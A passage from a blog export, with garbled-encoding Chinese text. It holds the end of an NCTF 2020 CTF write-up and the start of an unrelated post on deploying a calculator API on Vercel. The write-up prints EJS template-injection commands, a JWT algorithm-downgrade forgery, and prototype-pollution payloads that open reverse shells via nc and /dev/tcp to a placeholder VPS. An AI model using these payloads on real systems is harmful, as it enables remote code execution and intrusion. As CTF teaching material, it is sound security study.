é‡Œæ‰§è¡Œï¼Œè¦†ç›–æ‰åŸæ¥çš„å‡½æ•°ï¼Œå†ä¼ å‚è¿›å»æ‰§è¡Œå°±å®Œäº‹ã€‚ function create(xx) { var _0x1bef85 = _0x1656 , _0x23132f = xx; var _0x1658d5 = _0x1bef85('0x8') + _0x23132f + _0x1bef85('0x2'); _0x1658d5 = btoa(xor(_0x1bef85('0xc'), _0x1658d5)); var _0x23601e = new XMLHttpRequest(); _0x23601e['open'](_0x1bef85('0x13'), _0x1bef85('0x7'), !![]), _0x23601e['setRequestHeader'](_0x1bef85('0x11'), _0x1bef85('0xd')); var _0x3deb5a = _0x1bef85('0x4') + escape(_0x1658d5); return _0x23601e[_0x1bef85('0xa')](_0x3deb5a), alert('Done.\\x0aCheck\\x20/templates\\x20now.'), ''; } è€ƒè™‘åˆ°æ˜¯ ejs æ¨¡æ¿å¼•æ“ï¼Œåº”è¯¥å°±æ˜¯ ejs æ³¨å…¥äº†ã€‚ æŸ¥äº†ä¸€ä¸‹ï¼Œå‚è€ƒ Y1ng å¸ˆå‚…çš„è„šæœ¬ã€‚ &lt;%- global.process.mainModule.require('child_process').execSync('cat app.js') %&gt; è¿™æ ·å¯ä»¥è¯»å–æºç ã€‚ const express = require('express'); const app = express(); const bodyParser = require('body-parser'); const cookieParser = require(\"cookie-parser\"); const path = require(\"path\"); const session = require(\"express-session\"); const FileStore = require('session-file-store')(session); const fs = require('fs'); app.set('views', __dirname + '/views'); app.set('view engine', 'ejs'); app.engine('html', require('ejs').renderFile); app.use(express.static('public')); app.use(session({ name: 'session', secret: 'T0pSsssecRet233#@###', store: new FileStore({path: path.join(__dirname, \"sessions\")}), resave: false, saveUninitialized: false })); app.use(bodyParser.urlencoded({ extended: false })); app.use(cookieParser()); const KEY= process.env.KEY || \"r5NmfIzU1uzl6Wp\"; const xor = (secretkey,value) =&gt; { return Array.prototype.slice.call(value).map( function(chr,index){ return String.fromCharCode(secretkey[index % secretkey.length].charCodeAt(0) ^ chr.charCodeAt(0)) }).join(''); } app.get('/' ,(req,res) =&gt; { let session=req.session; if(session.AccessGranted === undefined){ session.AccessGranted=true; } return res.render('index.html'); }) app.get('/templates', (req,res) =&gt; { const session = req.session; if(session.AccessGranted !== \"undefined\" &amp;&amp; session.AccessGranted === true){ try{ let template_path = path.join(\"templates/\", session.id, 'index.html'); return res.render(template_path); }catch(err){ throw err; } }else{ return res.send('Not Accessible Now.'); } }); app.post('/create', (req,res) =&gt; { const session = req.session; if(session.AccessGranted !== \"undefined\" &amp;&amp; session.AccessGranted === true){ try{ const id = session.id; const raw = Buffer.from(req.body.code, 'base64').toString(); const contents = xor(KEY,raw); let template_path = path.join(__dirname , \"/views/templates/\", id, 'index.html'); if (!fs.existsSync(path.join(__dirname , \"/views/templates/\", id))) { fs.mkdirSync(path.join(__dirname , \"/views/templates/\", id)); } fs.writeFileSync(template_path, contents); return res.send('done'); }catch(err){ throw err; } }else{ return res.send('Not Accessible Now.'); } }); app.all('*', (req, res) =&gt; { return res.status(404).send('404 page not found'); }); app.listen(8088, () =&gt; console.log('Listening on port 8088')); è€Œåæ‰¾ flag å°±å¥½äº†ã€‚ var payload = \"&lt;%- global.process.mainModule.require('child_process').execSync('ls -alh') %&gt;\" total 92K drwxr-xr-x 1 root root 4.0K Nov 17 11:29 . drwxr-xr-x 1 root root 4.0K Nov 21 00:55 .. -rw-r--r-- 1 root root 2.6K Nov 17 11:10 app.js drwxr-xr-x 95 root root 4.0K Nov 17 11:29 node_modules -rw-r--r-- 1 root root 24.9K Nov 17 11:29 package-lock.json -rw-r--r-- 1 root root 447 Nov 17 11:10 package.json drwxr-xr-x 6 root root 4.0K Nov 17 11:10 public drwxr-xr-x 1 nobody nobody 24.0K Nov 21 18:02 sessions drwxr-xr-x 1 root root 4.0K Nov 17 11:10 views var payload = \"&lt;%- global.process.mainModule.require('child_process').execSync('ls / -alh') %&gt;\" drwxr-xr-x 1 root root 4.0K Nov 21 00:55 . drwxr-xr-x 1 root root 4.0K Nov 21 00:55 .. -rwxr-xr-x 1 root root 0 Nov 21 00:55 .dockerenv drwxr-xr-x 1 root root 4.0K Nov 17 11:29 app drwxr-xr-x 1 root root 4.0K Nov 16 23:22 bin drwxr-xr-x 5 root root 340 Nov 21 06:12 dev drwxr-xr-x 1 root root 4.0K Nov 21 00:55 etc -rw-r--r-- 1 node node 32 Nov 18 01:51 flag.txt drwxr-xr-x 1 root root 4.0K Nov 16 23:22 home drwxr-xr-x 1 root root 4.0K Nov 16 23:22 lib drwxr-xr-x 5 root root 4.0K Apr 23 2020 media drwxr-xr-x 2 root root 4.0K Apr 23 2020 mnt drwxr-xr-x 1 root root 4.0K Nov 16 23:22 opt dr-xr-xr-x 357 root root 0 Nov 21 06:12 proc drwx------ 1 root root 4.0K Nov 17 11:29 root drwxr-xr-x 2 root root 4.0K Apr 23 2020 run drwxr-xr-x 2 root root 4.0K Apr 23 2020 sbin drwxr-xr-x 2 root root 4.0K Apr 23 2020 srv dr-xr-xr-x 13 root root 0 Nov 21 06:12 sys drwxrwxrwt 1 root root 4.0K Nov 16 23:22 tmp drwxr-xr-x 1 root root 4.0K Nov 16 23:22 usr drwxr-xr-x 1 root root 4.0K Apr 23 2020 var æœ€åè¯» flagã€‚ var payload = \"&lt;%- global.process.mainModule.require('child_process').execSync('cat /flag.txt') %&gt;\" NCTF{Welcome_to_The_js_W0rld:)} BTW, CVE-2020-7699ï¼šNodeJSæ¨¡å—ä»£ç æ³¨å…¥ï¼Œexpress-fileupload npmç»„ä»¶ã€‚ D^3CTF å®˜æ–¹WriteUp â€”â€” ejs getshell ä»–çš„è„šæœ¬å¦‚ä¸‹ã€‚ï¼ˆå¥½å®¶ä¼™ï¼Œç›´æ¥ getshellã€‚ {\"content\": {\"constructor\": {\"prototype\": {\"outputFunctionName\": \"a; return global.process.mainModule.constructor._load('child_process').execSync('bash -c \"/bin/bash -i &gt; /dev/tcp/ip/port 0&lt;&amp;1 2&gt;&amp;1\"'); //\"}}}} PackageManager_v1.0 Admin uses this api server to manage his package . Definitely no way to RCE. Please make sure you can exploit it locally fisrt. all packages are up to date source code: é“¾æ¥ï¼šhttps://pan.baidu.com/s/19fm5JUvpjPEUVs528qRDSw æå–ç ï¼štxai å®¡é˜…æºç ï¼Œåœ¨ router/index.js é‡Œå¤„ç†è·¯ç”±ã€‚ router.get('/', (req,res) =&gt; { return res.render('index.html'); }); router.get('/api/package', async(req, res) =&gt; { let token = req.cookies['auth']; if( token == undefined ){ user={ username : \"guest\" }; token=await JWT.sign(user); res.cookie('auth', token, { httpOnly: true }) } return res.render('index.html',{ author : package.author , description : package.description }); }); router.post('/api/package',AuthMiddlerware,(req,res)=&gt;{ let newpackage={}; newpackage=rep.replicate(newpackage,req.body); return res.render('index.html',{ author : newpackage.author , description : newpackage.description }); }); //only for self debugging router.get('/debug/:command', AuthMiddlerware,(req,res) =&gt;{ let command= req.params.command; if(command){ if (command == 'cwd') { let proc = fork('./checkcwd.js', [], { stdio: ['ignore', 'pipe', 'pipe', 'ipc'] }); proc.stderr.pipe(res); proc.stdout.pipe(res); return; } return res.send('Invalid command'); } else{ return res.end('No command specified.'); } }); å‘ç° GET è¯·æ±‚ /api/packageè¿™é‡Œç”¨åˆ°äº† JWT é‰´æƒï¼Œå…³é”®çš„éƒ¨åˆ†å¦‚ä¸‹ã€‚ module.exports = { async sign(data) { data = Object.assign(data, { pk : publicKey } ); return (await jwt.sign(data, privateKey, { algorithm:'RS256' })) }, async decode(token) { return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] })); } } å¯ä»¥çœ‹åˆ°æŠŠå…¬é’¥åŒ…å«åˆ°äº† JWT ä¸­ï¼Œè€Œä¸”è§£å¯†çš„æ—¶å€™èƒ½å¤Ÿç”¨ HS256 ç®—æ³•ï¼Œäºæ˜¯å‚è€ƒ Hackergame2020 æ™®é€šçš„èº«ä»½è®¤è¯å™¨ ä¸€é¢˜ï¼Œå°† RS256 é™çº§ä¸º HS256ã€‚ ï¼ˆå¼•ç”¨è‡ªå·±ä¹‹å‰çš„ WPï¼Œè®²ç©¶ é¦–å…ˆè·å– cookieã€‚ eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEb0RHcEhrYW9LTGVKWEhIblFVRjF0K2FuWFxucWlyNzlZajN2ZkRGVE9wNnFobDZHc255dWNFZGlDSTF6M2xpZEoycGQxbWpUN2t3M2lzTlY2R2taV28yaS9VWVxuT1Zsa0lhV1dEd3RKTXVKdVNsRTR0M3p1WU0wRFlOVEZFelM1akYvUmwzY05MU0J0R2xlb2JtMXFFS0gvZUFnS1xub3NYZWZudEZ5UFlhdm4vdUlRSURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTYwNjAzNzIxMn0.002iwHbUK25horYZdXwN2c9mxu9ak-258TcHRo2NbCjERbzSZCQea_wfgyuYQkAoE1uurJ0dLCJw4Ozi-iXN6KA92UpgHUX0voNLYtcQENNqMTwyKldUztu6AR9eqdhftLTOLDWuIylqjoPkQA7pFYJXx2yfh5UkEqWW6arFTZs base64 è§£å¯†ï¼Œå–å¤´éƒ¨ Headerã€è½½è· Payloadã€‚ {\"alg\":\"RS256\",\"typ\":\"JWT\"}.{\"username\":\"guest\",\"pk\":\"-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDoDGpHkaoKLeJXHHnQUF1t+anX\\nqir79Yj3vfDFTOp6qhl6GsnyucEdiCI1z3lidJ2pd1mjT7kw3isNV6GkZWo2i/UY\\nOVlkIaWWDwtJMuJuSlE4t3zuYM0DYNTFEzS5jF/Rl3cNLSBtGleobm1qEKH/eAgK\\nosXefntFyPYavn/uIQIDAQAB\\n-----END PUBLIC KEY-----\\n\",\"iat\":1606037212} ä¿®æ”¹åŠ å¯†ç®—æ³•ï¼Œusernameæ”¹ä¸º adminã€‚ å† base64 åŠ å¯†ï¼Œå»é™¤ =ï¼Œå¾—åˆ° eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEb0RHcEhrYW9LTGVKWEhIblFVRjF0K2FuWFxucWlyNzlZajN2ZkRGVE9wNnFobDZHc255dWNFZGlDSTF6M2xpZEoycGQxbWpUN2t3M2lzTlY2R2taV28yaS9VWVxuT1Zsa0lhV1dEd3RKTXVKdVNsRTR0M3p1WU0wRFlOVEZFelM1akYvUmwzY05MU0J0R2xlb2JtMXFFS0gvZUFnS1xub3NYZWZudEZ5UFlhdm4vdUlRSURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTYwNjAzNzIxMn0 ç»“åˆå…¬é’¥è®¡ç®—åŠ å¯†æ‰€ç”¨çš„ç­¾åï¼ˆSignatureï¼‰ã€‚ $ echo -n \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEb0RHcEhrYW9LTGVKWEhIblFVRjF0K2FuWFxucWlyNzlZajN2ZkRGVE9wNnFobDZHc255dWNFZGlDSTF6M2xpZEoycGQxbWpUN2t3M2lzTlY2R2taV28yaS9VWVxuT1Zsa0lhV1dEd3RKTXVKdVNsRTR0M3p1WU0wRFlOVEZFelM1akYvUmwzY05MU0J0R2xlb2JtMXFFS0gvZUFnS1xub3NYZWZudEZ5UFlhdm4vdUlRSURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTYwNjAzNzIxMn0\" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d4947664d413047435371475349623344514542415155414134474e4144434269514b426751446f444770486b616f4b4c654a5848486e51554631742b616e580a7169723739596a3376664446544f703671686c3647736e7975634564694349317a336c69644a327064316d6a54376b773369734e5636476b5a576f32692f55590a4f566c6b496157574477744a4d754a75536c453474337a75594d3044594e5446457a53356a462f526c33634e4c534274476c656f626d3171454b482f6541674b0a6f735865666e744679505961766e2f7549514944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a (stdin)= 2eeceba7b1828a217aa00ca6795bcaa1ca2f2391e731362b1f5ac1084f11966d è½¬æ¢ä¸º JWT formatã€‚ $ python -c \"exec(\\\"import base64, binascii\\nprint base64.urlsafe_b64encode(binascii.a2b_hex('2eeceba7b1828a217aa00ca6795bcaa1ca2f2391e731362b1f5ac1084f11966d')).replace('=','')\\\")\" Luzrp7GCiiF6oAymeVvKocovI5HnMTYrH1rBCE8Rlm0 æ‹¼æ¥å¾—åˆ° JWT. eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEb0RHcEhrYW9LTGVKWEhIblFVRjF0K2FuWFxucWlyNzlZajN2ZkRGVE9wNnFobDZHc255dWNFZGlDSTF6M2xpZEoycGQxbWpUN2t3M2lzTlY2R2taV28yaS9VWVxuT1Zsa0lhV1dEd3RKTXVKdVNsRTR0M3p1WU0wRFlOVEZFelM1akYvUmwzY05MU0J0R2xlb2JtMXFFS0gvZUFnS1xub3NYZWZudEZ5UFlhdm4vdUlRSURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTYwNjAzNzIxMn0.Luzrp7GCiiF6oAymeVvKocovI5HnMTYrH1rBCE8Rlm0 æŠŠ cookie é‡Œçš„ auth ä¿®æ”¹ä¸ºå¦‚ä¸Šï¼ŒæˆåŠŸè®¿é—® /debug/cwdï¼Œç»“åˆ checkcwd.js æç¤ºå½“å‰ç›®å½•ä¸º /appã€‚ const cwd=process.cwd(); if(cwd == '/app'){ console.log('You are in the /app directory.'); } else{ console.log('You are not in the /app directory.'); } æˆåŠŸåˆ©ç”¨ POST è¯·æ±‚ä¿®æ”¹é¡µé¢å†…å®¹ã€‚ æ¥ä¸‹æ¥è€ƒè™‘ æ±¡æŸ“åŸå‹é“¾ã€‚ rep.replicate(a, b) å‡½æ•°æ˜¯å°† b ä¸­çš„æ¯ä¸€é¡¹å†…å®¹é€’å½’åœ°èµ‹å€¼ç»™ aã€‚ å‚è€ƒ NodeJS child_process å®˜æ–¹æ–‡æ¡£ï¼Œä»¥åŠ ä»Kibana-RCEå¯¹nodejså­è¿›ç¨‹åˆ›å»ºçš„æ€è€ƒ ä¸€æ–‡ï¼Œå¯ä»¥æŠŠ Object.env ç»™æ±¡æŸ“æ‰ã€‚ nodeç‰ˆæœ¬&gt;v8.0.0ä»¥åæ”¯æŒè¿è¡Œ node æ—¶å¢åŠ ä¸€ä¸ªå‘½ä»¤è¡Œå‚æ•°NODE_OPTIONSï¼Œå®ƒèƒ½å¤ŸåŒ…å«ä¸€ä¸ªjsè„šæœ¬ï¼Œç›¸å½“äºincludeã€‚ è€Œ Linux ä¸­çš„ç¯å¢ƒå˜é‡ä¹Ÿä¼šå­˜åˆ°æ–‡ä»¶ä¸­ï¼Œå…·ä½“åœ¨ /proc/self/environã€‚ å†æŠŠè¦æ‰§è¡Œçš„å‘½ä»¤æ‰”å¦ä¸€ä¸ªenvç¯å¢ƒå˜é‡é‡Œï¼Œå½“ fork æ‰§è¡Œæ–°è¿›ç¨‹æ—¶å°±ä¼šè°ƒç”¨è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œä»è€Œå®ç° RCEã€‚ Payload: è¿™é‡Œç›´æ¥åå¼¹ shell äº†ã€‚ POST http://42.192.72.11:8092/api/package {\"author\":\"MiaoTony\", \"description\":\"meow\", \"__proto__\":{\"env\":{\"AAAA\":\"require(\\\"child_process\\\").exec('nc VPSIP PORT -e /bin/sh')//\", \"NODE_OPTIONS\":\"--require /proc/self/environ\"}}} æˆ–è€… {\"author\":\"MiaoTony\", \"description\":\"meow\", \"__proto__\":{\"env\":{\"AAAA\":\"require(\\\"child_process\\\").exec(\\\"bash -i &gt;&amp; /dev/tcp/VPSIP/PORT 0&gt;&amp;1\\\")//\", \"NODE_OPTIONS\":\"--require /proc/self/environ\"}}} åœ¨ VPS ä¸Šç›‘å¬ç«¯å£ã€‚ nc -lvvp PORT è€Œåè®¿é—® http://42.192.72.11:8092/debug/cwd è§¦å‘ forkã€‚ åœ¨æ ¹ç›®å½•ä¸‹æ‹¿åˆ° flagã€‚ NCTF{https://xz.aliyun.com/t/6755_f0rk_p1us_prot0type_p0llution_1quals_RCE...???} ï¼ˆå¥½å·§å•Šï¼Œæˆ‘ä»¬çœ‹åˆ°äº†åŒä¸€ç¯‡æ–‡ç«  23333 é¡ºä¾¿çœ‹äº†ä¸€çœ¼ package.json ã€‚ è¦ä¸æ˜¯æƒé™é—®é¢˜å°±èƒ½æŠŠ package.json ç»™æ”¹äº†ï¼ˆå¤§é›¾ å®šæ—¶é‡å¯è¿˜æ˜¯æŒºæ–‡æ˜çš„ã€‚ Miscå½©è›‹å…³æ³¨å…¬ä¼—å· å›å¤ flag å°±æ‹¿åˆ°äº†ã€‚ NCTF{We1c0m3_t0_NCTF2020} ï¼ˆåæ§½ä¸€å¥ï¼Œå¸ˆå‚…ä»¬ç©ºé—´é‡Œè½¬çš„æ ¡å†…æ¨ªå¹…å±…ç„¶å¤šäº†ä¸ª !ï¼Œå°±ç¦»è°±ã€‚ NCTF2020é—®å·è°ƒæŸ¥NCTF{Let's_look_forward_to_X1CTF} è¿™å°±é”¤çˆ† fmyyï¼ å°ç»“ åœ¨è€—å­é”…é”…å’Œç§¦å¸ˆå‚…çš„å¸¦é¢†ä¸‹ï¼Œæ‹¿åˆ°äº†æ€»æ¦œç¬¬å…­ã€‚ Team H4rdwo3k1ng ğŸ€å“¥å“¥è¯´ä»–å¤ªæ¿€åŠ¨äº†å¤šæ‰“äº†ä¸ª Team ï¼ˆç„¶åè¿˜æ”¹ä¸äº† x å‘œå‘œå‘œï¼Œå·®ç‚¹å°±èƒ½æ‹¿ Xray é«˜çº§ç‰ˆ license äº†ï¼ˆï¼ˆï¼ˆè¿˜æ˜¯å¤ªèœäº†å•Š æ€»è€Œè¨€ä¹‹ï¼Œè¿™æ¬¡ NCTF 2020 è¿˜æ˜¯æŒºå¥½ç©çš„ï¼Œé¢˜ç›®è´¨é‡ä¸é”™ã€‚ å°±æ˜¯æ²¡æœ‰çœŸæ­£çš„ Misc é¢˜ï¼Œç¡¬è‚ Web é¢˜å¤ªéš¾é¡¶äº†ã€‚ä¸è¿‡å­¦åˆ°äº†ä¸å°‘å€’æ˜¯äº†å˜¿å˜¿ã€‚ ä¸‹æ¬¡æœ‰æœºä¼šçš„è¯å†æ¥ç©w~ å™¢å¯¹äº†ï¼Œå»çº¿ä¸‹ä¸€å®šé”¤çˆ† fmyyï¼ BTW, å®˜æ–¹ WriteUp ä¹Ÿå‡ºæ¥äº†ã€‚ Web é¢˜ç›®ç¯å¢ƒ GitHub repo: baiyecha404 / My-NCTF2020-Challs ï¼ˆæºœäº†æºœäº†å–µ~","path":"2020/11/23/CTF_2020NJUPTCTF/"},{"title":"åŸºäºVercel Serverlesséƒ¨ç½²Calc114514 API & Telegram bot","text":"0x00 Preface å‰è¨€æœ€è¿‘ï¼Œå—åˆ° USTC Hackergame 2020ï¼ˆä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ç¬¬ä¸ƒå±Šä¿¡æ¯å®‰å…¨å¤§èµ›ï¼‰è¶…ç²¾å·§çš„æ•°å­—è®ºè¯å™¨ ä¸€é¢˜å¯å‘ï¼Œå¯»æ€ç€å’±å¯ä»¥æ•´ä¸€ä¸ªç½‘é¡µç‰ˆæœ¬ / Telegram bot ç‰ˆæœ¬çš„ 114514 æ•°å­—è®ºè¯å™¨ã€‚ See also: USTC Hackergame 2020 WriteUp by MiaoTony è¯´å¹²å°±å¹²ï¼Œè€ƒè™‘åˆ° Vercel æœ‰ä¸ª Serverless Function æœåŠ¡ï¼Œä¹‹å‰ä¹Ÿå°è¯•è¿‡åœ¨ä¸Šé¢æ­ APIï¼ˆè™½ç„¶é‚£æ—¶ç”±äºæ‰§è¡Œæ—¶é—´é™åˆ¶ç­‰åŸå› æ²¡ç”¨ä¸Šï¼‰ï¼Œè¿™æ¬¡çš„ 114514 è®ºè¯å®é™…ä¸Šå¹¶ä¸å¤æ‚ï¼Œäºæ˜¯å°±æ¥æ•´ä¸€ä¸ªå§ï¼ ï¼ˆServerless çœŸé¦™ï¼ 0x01 TL; DRç›´æ¥è¯´å¦‚ä½•ä½“éªŒï¼Œå…·ä½“å¦‚ä½•å®ç°åé¢å†å±•å¼€ã€‚ å‰åç«¯åˆ†ç¦»ï¼Œå‡éƒ¨ç½²åœ¨ Vercelã€‚ å‰ç«¯ï¼šhttps://calc114514.vercel.app/ Telegram bot: @calc114514bot. é¡¹ç›®å¼€æºåœ¨ GitHub ä¸Šï¼šhttps://github.com/miaotony/calc114514 æ¬¢è¿æ¥ç‚¹ä¸ª Star å–µ~ API å¼€æ”¾æ¥å£ GET / POST https://calc114514.vercel.app/api/calc Param: num a number here. isJson Optional. If 1, return the result(s) with JSON format, else return text/plain result. Return: See examples below. Examples: $ curl \"https://calc114514.vercel.app/api/calc?num=114514\" -~-~-~-~(-~(-~-~-~-~-~(-~-~-~-~(-~(-~~-1*-~-~-~-~-~-~-~-~-~1)*-~-~-~-~-~-~4)*-~-~-~-~-~5)*-~-~-~-~-~-~-~-~-~1)*-~-~-~-~-~-~4) $ curl \"https://calc114514.vercel.app/api/calc?isJson=1&amp;num=114514\" {\"answer\":\"-~-~-~-~(-~(-~-~-~-~-~(-~-~-~-~(-~(-~~-1*-~-~-~-~-~-~-~-~-~1)*-~-~-~-~-~-~4)*-~-~-~-~-~5)*-~-~-~-~-~-~-~-~-~1)*-~-~-~-~-~-~4)\",\"number\":\"114514\"} Telegram botSee @calc114514bot. Usage: Send a number to @calc114514bot. ç›´æ¥ç»™æœºå™¨äººå‘æ•°å­—ã€‚ Use inline query method, @calc114514bot &lt;Number Here&gt; . åœ¨ä»»æ„çš„è¾“å…¥æ¡†è¾“å…¥ @calc114514bot ä½ æƒ³è®ºè¯çš„æ•°å­—ã€‚ ç¬¬ä¸€ä¸ªä¸å¸¦åŸæ•°ï¼Œç¬¬äºŒä¸ªå¸¦åŸæ•°ï¼Œæ•ˆæœåˆ†åˆ«å¦‚ä¸‹æ‰€ç¤ºã€‚ 0x02 Review of the question é¢˜ç›®å›é¡¾ æ•°å­—è®ºè¯æ˜¯ä¸€ç§å¸¸è§çš„å®šç†è¯æ˜æ–¹æ³•ã€‚ ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å¯¹äºç»™å®šçš„è‡ªç„¶æ•°ï¼Œæ‰¾å‡ºä¸€ä¸ªç­‰å€¼çš„è¡¨è¾¾å¼ï¼Œå¦‚æœè¯¥è¡¨è¾¾å¼å»é™¤æ‰€æœ‰ç¬¦å·éƒ¨åˆ†åä¸ºå­—ç¬¦ä¸²ã€Œ114514ã€ï¼Œåˆ™å®Œæˆè®ºè¯ã€‚è¡¨è¾¾å¼ä»…å…è®¸æ•´æ•°è¿ç®—ï¼Œå¯ä»¥ä½¿ç”¨æ‹¬å·ã€å¸¸è§çš„ä»£æ•°è¿ç®—ç¬¦ +-*/% å’Œä½è¿ç®—ç¬¦ ~^&amp;|ã€‚ Via: USTC Hackergame 2020 Calculate a number with 114514 &amp; some operators. äºæ˜¯æˆ‘ä»¬å°±éœ€è¦åˆ©ç”¨ 114514 åŠä¸€äº›è¿ç®—ç¬¦æ„é€ å‡ºæ‰€ç»™çš„æ•°å­—ã€‚ See also: è¶…ç²¾å·§çš„æ•°å­—è®ºè¯å™¨ (official writeup) 0x03 Demonstration method è®ºè¯ç®—æ³•å…­ä½æ•°ä»¥å†…è®ºè¯æ–¹æ³•åœ¨ä¸è¶…è¿‡6ä½æ•°ï¼Œå³ 0 &lt;= num &lt;= 999999 çš„è®ºè¯ä¸Šï¼Œå‚è€ƒäº† å®˜æ–¹ WriteUp é‡Œçš„ç®—æ³•ã€‚ é‡è¦æ€§è´¨ï¼š -~x == x+1~-x == x-1 å¯¹äºä»»æ„ x éƒ½æˆç«‹ã€‚ ä¸€ä¸ªåŠæ³•å°±æ˜¯æŒ‰ç…§åè¿›åˆ¶çš„æ–¹å¼æ¥å‡‘ï¼Œå³ given_number = (((((((0+a)*10+b)*10+c)*10+d)*10)+e)*10)+f ï¼Œå…¶ä¸­ a b c d e f ä¸º 0 åˆ° 9 ä¹‹é—´çš„æ•´æ•°ã€‚è¡¨è¾¾å¼ä¸­çš„å€¼ 0 10 10 10 10 10 å¯ä»¥åˆ†åˆ«åˆ©ç”¨ 1 1 4 5 1 4 ä¸åµŒå¥— ~- æ¥å‡‘å‡ºï¼Œè€Œ +a +b +c +d +e +f å¯ä»¥ç›´æ¥åˆ©ç”¨åµŒå¥— ~- æ¥å®ç°ï¼ˆä¸éœ€è¦ä½¿ç”¨æ•°å­—ï¼‰ã€‚ def getans(number): \"\"\" Get the answer using `114514` &amp; `-~`, `~-`. å‚è€ƒå®˜æ–¹ WriteUpï¼ŒåŸºäºåè¿›åˆ¶åˆ†è§£å®ç°ï¼Œæ”¯æŒ6ä½åŠä»¥ä¸‹æ•°å­— \"\"\" jz = 10 s = [] e = \"114514\" for c in e[:1]: s.append(\"~-\" * (int(c)) + c) # value is zero for c in e[1:]: s.append(\"-~\" * (jz - int(c)) + c) # value is jz ans = \"\" for i in range(len(e)): digit = (number // (jz ** (len(e) - 1 - i))) % jz ans = \"(\" + ans + \"*\" + s[i] + \")\" if i &gt; 0 else s[i] ans = \"-~\" * digit + ans return ans è¶…è¿‡å…­ä½æ•°çš„è®ºè¯æ–¹æ³•å¯¹äºæ‰€ç»™æ•´æ•°nï¼Œé‡‡ç”¨ä¸åè¿›åˆ¶ç±»ä¼¼çš„æ–¹æ³•ï¼Œåœ¨ $ n^{1/6} $ é™„è¿‘å–å…­ä¸ªæ•°ï¼Œæ¯ä½å–ä¸åŒè¿›åˆ¶ï¼Œæœ€åå†å‡‘åˆ°æ‰€ç»™çš„æ•°ã€‚ ï¼ˆTODOï¼‰ 0x04 éƒ¨ç½² API æ¥å£å…¶å®å†™ä¸ªæ¥å£çš„è¯å¹¶ä¸éš¾ï¼Œä¸ªäººä¹ æƒ¯å°±ä½¿ç”¨ Python3 åŠ Flask è¿›è¡Œå¼€å‘äº†ã€‚ ç®€å•åœ°è¯´ï¼Œå°±æ˜¯æŠŠè·¯ç”±é…å¥½ï¼Œæ‰€éœ€çš„å‚æ•°ä¼ è¿›æ¥ï¼Œä¸¢åˆ°å¤„ç†çš„å‡½æ•°é‡Œï¼ŒæŠŠç»“æœå†æŒ‰ç…§éœ€æ±‚è¿”å›ç»™ç”¨æˆ·å°±å®Œäº‹äº†ã€‚ ä½†æ˜¯åˆä¸æƒ³ä¸ºäº†è¿™ç©æ„å„¿å°±æ•´ä¸ªæœåŠ¡å™¨ï¼Œä¹Ÿæ‡’å¾—è¿ç»´ï¼Œäºæ˜¯æƒ³åˆ°äº†ä»¥ Serverless æ— æœåŠ¡å™¨ çš„å½¢å¼è¿›è¡Œéƒ¨ç½²ã€‚ å¸¸è§çš„ Serverless æœåŠ¡ä¹ŸæŒºå¤šï¼Œæ¯”å¦‚ AWS Lambda, Heroku, Cloudflare Workers, Vercel, etc. è¿™é‡Œå°±ç”¨ Vercel æ¥å®ç°å§ã€‚ Vercel ä»‹ç» Vercel is the optimal workflow for frontend teams. All-in-one: Static and Jamstack deployment, Serverless Functions, and Global CDN. Vercel is a cloud platform for static sites and Serverless Functions that fits perfectly with your workflow. It enables developers to host Jamstack websites and web services that deploy instantly, scale automatically, and requires no supervision, all with no configuration. å®˜ç½‘å°±æ˜¯ https://vercel.com å®ƒæ˜¯ä¸€ä¸ªæä¾›äº†é™æ€èµ„æºå’Œ Serverless å‡½æ•°æœåŠ¡çš„äº‘å¹³å°ï¼Œå¯ä»¥åœ¨åŒä¸€ä¸ªç½‘ç«™ä¸Šè¿›è¡Œéƒ¨ç½²ã€‚ å¯¹äº Vue.js / Next.js / Hexo / Hugo / â€¦ ç­‰ç­‰ä¸»æµå‰ç«¯æ¡†æ¶ï¼Œä½ åªéœ€è¦æŠŠåŸå§‹ä»£ç ä¸Šä¼ ï¼ŒæŒ‡å®šå¥½ä¾èµ–ï¼Œå®ƒå°±èƒ½å¸®ä½ æ„å»ºé™æ€æ–‡ä»¶ï¼Œè‡ªåŠ¨å®Œæˆéƒ¨ç½²ã€‚ å®ƒæ”¯æŒ GitHubã€GitLab å’Œ Bitbucket é›†æˆï¼Œä¹Ÿæ”¯æŒé€šè¿‡å‘½ä»¤è¡Œ CLI å·¥å…·è¿›è¡Œéƒ¨ç½²ã€‚ è€Œä¸” 